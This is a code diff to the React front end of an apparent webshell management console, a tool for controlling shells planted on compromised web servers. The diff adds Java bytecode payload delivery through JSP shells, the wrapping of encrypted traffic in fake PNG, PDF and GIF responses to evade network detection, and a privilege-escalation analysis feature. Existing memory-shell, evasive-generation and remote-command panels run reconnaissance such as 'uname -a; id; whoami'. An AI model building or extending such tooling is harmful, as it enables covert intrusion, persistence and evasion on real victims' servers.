@@ -19,11 +19,16 @@ import {
   FolderUpIcon, FilePlusIcon, FolderPlusIcon, PencilLineIcon,
   InfoIcon, FolderIcon, TerminalIcon, DatabaseIcon, NetworkIcon,
   CpuIcon, BugIcon, LayoutGridIcon, PackageIcon, CameraIcon, WrenchIcon,
-  NotebookPenIcon, XIcon,
+  NotebookPenIcon, XIcon, ShieldIcon,
 } from "lucide-react";
 
 const SCRIPT_TYPES = ["php", "jsp", "jspx", "asp", "aspx", "py", "node"];
 const ENCODERS = ["raw", "aes", "xor"];
+// 载荷投递方式：脚本=把源码交给目标端解释器；java=只发字节码，由 JSP 载体 defineClass（仅 jsp/jspx）
+const CARRIERS = [{ v: "", label: "脚本" }, { v: "java", label: "Java 载荷" }];
+// 响应体伪装链：密文套进合法图片/文档外壳，流量侧看不到裸密文
+const DISGUISES = [{ v: "", label: "伪装链：自动" }, { v: "png", label: "伪装链：PNG" }, { v: "pdf", label: "伪装链：PDF" }, { v: "gif", label: "伪装链：GIF" }];
+const isJavaCarrier = (t?: { carrier?: string }) => t?.carrier === "java";
 
 function extOps(st: string): string[] {
   if (st === "php") return ["db", "net", "proc", "phptool"];
@@ -86,7 +91,7 @@ export default function WebshellConsole() {
   };
 
   const openEdit = (t?: WSTarget) => {
-    setEdit(t ? { ...t } : { group: "default", encoder: "raw", script_type: "php", url: "", password: "", name: "", note: "", headers: "" });
+    setEdit(t ? { ...t } : { group: "default", encoder: "raw", script_type: "php", url: "", password: "", name: "", note: "", headers: "", carrier: "", disguise: "" });
   };
 
   const saveEdit = async () => {
@@ -140,7 +145,11 @@ export default function WebshellConsole() {
                 <td className="py-1 font-mono text-blue-500" title={t.url}>{t.url}</td>
                 <td className="font-mono text-muted-foreground">{t.has_password ? "••••" : "-"}</td>
                 <td>{t.encoder}</td>
-                <td>{t.script_type}</td>
+                <td>
+                  {t.script_type}
+                  {isJavaCarrier(t) && <span className="ml-1 rounded bg-violet-500/15 px-1 text-[10px] text-violet-600" title="Java 动态载荷：目标端只收字节码">java</span>}
+                  {t.disguise && <span className="ml-1 rounded bg-amber-500/15 px-1 text-[10px] text-amber-600" title="响应体伪装链">{t.disguise}</span>}
+                </td>
                 <td className="text-muted-foreground">{t.group}</td>
                 <td className="truncate text-muted-foreground" title={t.note}>{t.note || (t.name && t.name)}</td>
                 <td>
@@ -173,6 +182,28 @@ export default function WebshellConsole() {
                 </select>
                 <Input placeholder="分组" value={edit.group || ""} onChange={(e) => setEdit({ ...edit, group: e.target.value })} />
               </div>
+              <div className="grid grid-cols-2 gap-2">
+                <select
+                  className="rounded border bg-transparent p-1.5 text-sm"
+                  value={edit.carrier || ""}
+                  onChange={(e) => {
+                    const carrier = e.target.value;
+                    // Java 载体只认 jsp/jspx，切过去时顺手纠正脚本类型，避免存下一个跑不起来的组合
+                    const st = carrier === "java" && !["jsp", "jspx"].includes(edit.script_type || "")
+                      ? "jsp" : edit.script_type;
+                    setEdit({ ...edit, carrier, script_type: st });
+                  }}
+                  title="载荷投递方式"
+                >
+                  {CARRIERS.map((x) => <option key={x.v} value={x.v}>{x.label}</option>)}
+                </select>
+                <select className="rounded border bg-transparent p-1.5 text-sm" value={edit.disguise || ""} onChange={(e) => setEdit({ ...edit, disguise: e.target.value })} title="响应体伪装链：目标端返回 PNG/PDF/GIF 包裹的密文时强制指定；留空按文件签名自动识别">
+                  {DISGUISES.map((x) => <option key={x.v} value={x.v}>{x.label}</option>)}
+                </select>
+              </div>
+              {isJavaCarrier(edit) && (
+                <div className="text-[11px] text-muted-foreground">Java 载荷：目标需 JRE 8+，支持命令执行、基础信息、文件管理、内存马、进程/网络/数据库（数据库需目标 classpath 自带 JDBC 驱动）。</div>
+              )}
               <Input placeholder='附加头 JSON（Gate/UA，如 {"X-Gate":"v"}）' value={edit.headers || ""} onChange={(e) => setEdit({ ...edit, headers: e.target.value })} />
               <textarea className="h-16 w-full rounded border bg-transparent p-2 text-xs" placeholder="备注" value={edit.note || ""} onChange={(e) => setEdit({ ...edit, note: e.target.value })} />
               <div className="flex justify-end gap-2">
@@ -195,6 +226,7 @@ export default function WebshellConsole() {
 function GenerateDialog({ onClose }: { onClose: () => void }) {
   const [st, setSt] = React.useState("php");
   const [enc, setEnc] = React.useState("raw");
+  const [carrier, setCarrier] = React.useState("");
   const [pwd, setPwd] = React.useState("");
   const [gateHeader, setGateHeader] = React.useState("");
   const [gateValue, setGateValue] = React.useState("");
@@ -213,7 +245,7 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
       const r = aiMode
         ? await api.wsGenerateAI({ script_type: st, password: pwd, features })
         : await api.wsGenerate({
-            script_type: st, encoder: enc, password: pwd,
+            script_type: st, encoder: enc, password: pwd, carrier,
             gate_header: gateHeader, gate_value: gateValue,
             evasive: evasiveLevel > 0, evasive_level: evasiveLevel,
           });
@@ -240,6 +272,29 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
               {ENCODERS.map((x) => <option key={x} value={x}>{x}</option>)}
             </select>
             <Input placeholder="连接密码" value={pwd} onChange={(e) => setPwd(e.target.value)} />
+          </div>
+          <div className="grid grid-cols-3 gap-2">
+            <select
+              className="rounded border bg-transparent p-1.5"
+              value={carrier}
+              onChange={(e) => {
+                const v = e.target.value;
+                setCarrier(v);
+                if (v === "java") {
+                  // 载体没有脚本文本可混淆，AI 生成与免杀变形都不适用
+                  if (!["jsp", "jspx"].includes(st)) setSt("jsp");
+                  setAiMode(false);
+                  setEvasiveLevel(0);
+                }
+              }}
+            >
+              {CARRIERS.map((x) => <option key={x.v} value={x.v}>{x.label}</option>)}
+            </select>
+            <div className="col-span-2 flex items-center text-[11px] text-muted-foreground">
+              {carrier === "java"
+                ? "Java 载荷：生成 JSP 载体，连上后由服务端下发字节码执行（命令/信息/文件管理/内存马/进程/网络/数据库）"
+                : "脚本载体：生成常规 webshell，支持全部插件能力"}
+            </div>
           </div>
           <label className="flex items-center gap-2 text-xs text-muted-foreground">
             <input type="checkbox" checked={aiMode} onChange={(e) => setAiMode(e.target.checked)} />
@@ -294,7 +349,11 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
 type PanelKey = "info" | "files" | "cmd" | "db" | "net" | "proc" | "memshell" | "servlet" | "jar" | "shot" | "phptool" | "note";
 
 function SessionWindow({ target, onClose }: { target: WSTarget; onClose: () => void }) {
-  const ops = extOps(target.script_type);
+  // Java 载体支持 exec/info/文件管理；数据库、网络、进程、内存马这几项在载荷里
+  // 用 JDK 自带 API 重写过等价实现（不依赖目标端解释器），所以也能开。
+  // 仍属脚本载体专属的：zip/unzip、Servlet 枚举、Jar 加载、远程屏幕、PHP 工具。
+  const javaCarrier = isJavaCarrier(target);
+  const ops = javaCarrier ? ["db", "net", "proc", "memshell"] : extOps(target.script_type);
   const panels: { key: PanelKey; label: string; icon: React.ReactNode }[] = [
     { key: "info", label: "基础信息", icon: <InfoIcon className="size-4" /> },
     { key: "files", label: "文件管理", icon: <FolderIcon className="size-4" /> },
@@ -320,7 +379,7 @@ function SessionWindow({ target, onClose }: { target: WSTarget; onClose: () => v
             <span className="size-3 rounded-full bg-red-500" /><span className="size-3 rounded-full bg-yellow-500" /><span className="size-3 rounded-full bg-green-500" />
           </span>
           <span className="ml-2 font-semibold text-zinc-100">{target.name || target.url}</span>
-          <span className="font-mono text-[11px] text-zinc-400">{target.script_type} · {target.encoder} · {target.url}</span>
+          <span className="font-mono text-[11px] text-zinc-400">{target.script_type} · {target.encoder}{target.carrier ? " · " + target.carrier : ""}{target.disguise ? " · " + target.disguise : ""} · {target.url}</span>
           <span className={`ml-2 rounded px-1.5 text-[10px] ${target.alive ? "bg-green-500/20 text-green-400" : "bg-zinc-700 text-zinc-400"}`}>
             {target.alive ? "已连接" : "未验证"}
           </span>
@@ -401,11 +460,24 @@ function useRunner(target: WSTarget) {
 
 function InfoPanel({ target }: { target: WSTarget }) {
   const [info, setInfo] = React.useState("");
+  const [busy2, setBusy2] = React.useState(false);
   const { busy, exec } = useRunner(target);
   const probe = async () => {
     const phpCmd = 'echo "PHP_OS=".PHP_OS."; PHPVER=".PHP_VERSION;';
     const r = await exec("exec", { cmd: target.script_type === "php" ? phpCmd : "uname -a; id; whoami" });
     setInfo(r.ok ? r.output : "[失败] " + r.error);
+  };
+  // 提权面分析：后端跑一组只读查询并结构化，返回纯文本视图直接展示
+  const privesc = async () => {
+    setBusy2(true);
+    try {
+      const r = await api.webshellPrivesc({ target_id: target.id });
+      setInfo(r.data?.text || "（无结果）");
+    } catch (e) {
+      setInfo("[失败] " + (e instanceof Error ? e.message : String(e)));
+    } finally {
+      setBusy2(false);
+    }
   };
   return (
     <div className="space-y-2 text-sm">
@@ -417,7 +489,10 @@ function InfoPanel({ target }: { target: WSTarget }) {
           </div>
         ))}
       </div>
-      <DBtn onClick={probe} disabled={busy}><PlayIcon className="size-3.5" /> 采集目标基础信息</DBtn>
+      <div className="flex gap-2">
+        <DBtn onClick={probe} disabled={busy}><PlayIcon className="size-3.5" /> 采集目标基础信息</DBtn>
+        <DBtn onClick={privesc} disabled={busy2}><ShieldIcon className="size-3.5" /> 提权面分析</DBtn>
+      </div>
       {info && <DPre>{info}</DPre>}
     </div>
   );
@@ -742,6 +817,16 @@ function NetPanel({ target }: { target: WSTarget }) {
     } catch { setOut(r.output); }
   };
   const netstat = async () => {
+    // java 载体直接读 /proc/net/tcp（或 netstat -ano），不需要目标装 netstat
+    if (target.carrier === "java") {
+      const r = await ext("net_list", {});
+      if (!r.ok) return setOut("[失败] " + r.error);
+      try {
+        const rows = JSON.parse(r.output.trim()) as { proto: string; local: string; remote: string; state: string }[];
+        setOut(rows.map((x) => `${(x.proto || "tcp").toUpperCase().padEnd(4)} ${String(x.local).padEnd(26)} ${String(x.remote).padEnd(26)} ${x.state}`).join("\n"));
+      } catch { setOut(r.output); }
+      return;
+    }
     const r = await exec("exec", { cmd: target.script_type === "php" ? "netstat -antp 2>/dev/null || netstat -an" : "netstat -ano" });
     setOut(r.ok ? r.output : "[失败] " + r.error);
   };
@@ -768,7 +853,9 @@ function ProcPanel({ target }: { target: WSTarget }) {
   const { busy, ext, exec } = useRunner(target);
 
   const list = async () => {
-    if (target.script_type === "php") {
+    // php 走 proc_list 插件，java 载体在载荷里重写了同等实现（读 /proc 或 tasklist），
+    // 其余脚本语言没有对应插件，退回 ps/tasklist 命令
+    if (target.script_type === "php" || target.carrier === "java") {
       const r = await ext("proc_list", {});
       if (!r.ok) return setRaw("[失败] " + r.error);
       try {
